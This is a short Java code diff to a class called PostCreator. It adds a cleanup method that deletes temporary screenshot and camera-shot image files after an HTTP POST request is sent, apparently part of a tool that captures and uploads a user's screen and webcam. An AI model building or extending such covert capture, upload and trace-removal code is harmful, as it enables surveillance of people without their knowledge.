@@ -1,4 +1,6 @@
 import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.FileSystems;
 import org.apache.http.HttpEntity;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
@@ -48,5 +50,14 @@ public class PostCreator {
 		}
 
 		System.out.println("[+] Request sent");
+	}
+
+	public void cleanup() {
+		try {
+			Files.delete(FileSystems.getDefault().getPath("./tempscreenshot.png"));
+			Files.delete(FileSystems.getDefault().getPath("./tempcamerashot.png"));
+		} catch (Exception e) {
+			System.out.println("[-] Failed to delete temporary files");
+		}
 	}
 }
